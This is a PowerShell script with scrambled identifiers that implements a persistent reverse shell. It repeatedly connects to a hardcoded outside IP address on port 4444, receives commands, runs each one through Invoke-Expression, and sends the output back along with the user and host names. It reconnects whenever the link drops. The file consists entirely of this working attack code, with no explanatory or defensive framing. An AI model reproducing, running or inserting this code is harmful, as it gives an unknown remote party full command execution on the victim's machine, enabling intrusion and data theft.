class HtMbbToqOmkw {
    
    [string]$eYowKta = "93.49.240.195"
    [int]$qemOxqHECmh = 4444

    $LgWDZsCLAcOdqMtsnVlvb
    $rObfIwPomJE
    $cdkATNOxdVL
    $oBnEexEbtLLYcUnE
    $rARyOtLlCtxnVFaq
    $WRQCBOaFUSCkjmYQIJxwFTtk
    [int]$vMKJLmriOUYPrpLe = 50*1024

    ZwzDgMHigGDt() {
        $this.rObfIwPomJE = $false
        while ($true) {
            try {
                $this.rObfIwPomJE = New-Object Net.Sockets.TcpClient($this.eYowKta, $this.qemOxqHECmh)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.SJZJKHsOtKDrzfEXVySf()
    }

    SJZJKHsOtKDrzfEXVySf() {
        $this.LgWDZsCLAcOdqMtsnVlvb = $this.rObfIwPomJE.GetStream()
        $this.oBnEexEbtLLYcUnE = New-Object Byte[] $this.vMKJLmriOUYPrpLe
        $this.WRQCBOaFUSCkjmYQIJxwFTtk = New-Object Text.UTF8Encoding
        $this.cdkATNOxdVL = New-Object IO.StreamWriter($this.LgWDZsCLAcOdqMtsnVlvb, [Text.Encoding]::UTF8, $this.vMKJLmriOUYPrpLe)
        $this.rARyOtLlCtxnVFaq = New-Object System.IO.StreamReader($this.LgWDZsCLAcOdqMtsnVlvb)
        $this.cdkATNOxdVL.AutoFlush = $true
    }

    SwKFJTHw() {
        $this.ZwzDgMHigGDt()
        $this.GajzWYKVcaBmzuJnYNpOPBtV()
    }

    TmevynIwsERAjPxbcRW($UjGZjaRWIeNwjhYUHMoevh) {
        try {
            [byte[]]$rrxunJZTLS = [text.Encoding]::Ascii.GetBytes($UjGZjaRWIeNwjhYUHMoevh)
            $this.cdkATNOxdVL.Write($rrxunJZTLS, 0, $rrxunJZTLS.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.SwKFJTHw()
        }
    }

    [string] SKzrVnbXJcfk() {
        try {
            $NlQTdFAeF = $this.LgWDZsCLAcOdqMtsnVlvb.Read($this.oBnEexEbtLLYcUnE, 0, $this.vMKJLmriOUYPrpLe)    
            $jqkJGWJLMCORWLAUnK = ($this.WRQCBOaFUSCkjmYQIJxwFTtk.GetString($this.oBnEexEbtLLYcUnE, 0, $NlQTdFAeF))
            return $jqkJGWJLMCORWLAUnK
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.SwKFJTHw()
            return ""
        }
    }

    [string] BIRSQVXhJ($YiShjr) {
        Write-Host $YiShjr
        try { 
            $nSIIBIZPRunPdTSLL = Invoke-Expression $YiShjr | Out-String
        }
        catch {
            $NuUWLBM = $_.Exception
            $EfcvIvKCTTVqxORRhXhZys = $_.Message
            $nSIIBIZPRunPdTSLL = "`n$_`n"
        }
        return $nSIIBIZPRunPdTSLL
    }

    [string] YRANz() {
        $KDWee = [Environment]::UserName
        $PxaJGqcAo = [System.Net.Dns]::GetHostName()
        $gHlIQowEFRilbzhJr = Get-Location
        return "$KDWee@$PxaJGqcAo [$gHlIQowEFRilbzhJr]~$ "
    }

    GajzWYKVcaBmzuJnYNpOPBtV() {
        while ($this.rObfIwPomJE.Connected) {
            $this.TmevynIwsERAjPxbcRW($this.YRANz())         
            $jqkJGWJLMCORWLAUnK = $this.SKzrVnbXJcfk()
            $nSIIBIZPRunPdTSLL = "`n"
            if ([string]::IsNullOrEmpty($jqkJGWJLMCORWLAUnK)) {
                continue
            }
            $nSIIBIZPRunPdTSLL = $this.BIRSQVXhJ($jqkJGWJLMCORWLAUnK)
            $this.TmevynIwsERAjPxbcRW($nSIIBIZPRunPdTSLL + "`n")
            $this.LgWDZsCLAcOdqMtsnVlvb.Flush()
        }
        $this.rObfIwPomJE.Close()
        $this.SwKFJTHw()
    } 
}

$UVqsUoKQ = [HtMbbToqOmkw]::new()
$UVqsUoKQ.SwKFJTHw()
